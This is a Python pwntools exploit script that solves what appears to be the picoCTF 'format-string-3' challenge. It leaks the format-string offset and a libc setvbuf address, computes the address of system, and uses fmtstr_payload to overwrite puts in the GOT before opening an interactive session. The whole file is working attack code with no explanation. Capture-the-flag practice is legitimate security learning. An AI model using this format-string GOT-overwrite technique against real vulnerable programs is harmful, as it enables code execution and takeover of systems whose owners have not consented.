#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./format-string-3')
libc = ELF('./libc.so.6')


def run():
    return process(elf.path)
    # return remote('rhea.picoctf.net', 58571)


# Find first controlled formatter offset
p = run()
p.sendline(b"AAAAAAAA" + b"-%p" * 60)
p.recvuntil(b'AAAAAAAA')
leak = p.recvline().strip().split(b'-')
offset = leak.index(b'0x4141414141414141')
log.info(f'{offset=}')

# Retrieve setvbuf address in libc
p = run()
p.recvuntil(b' Here\'s the address of setvbuf in libc: ')
setvbuf_addr = int(p.recvline().strip(), 16)
log.info(f'{setvbuf_addr=:x}')

system_addr = setvbuf_addr - libc.sym.setvbuf + libc.sym.system

payload = fmtstr_payload(offset, {elf.got.puts: system_addr})
p.sendline(payload)

# Get flag
p.interactive()
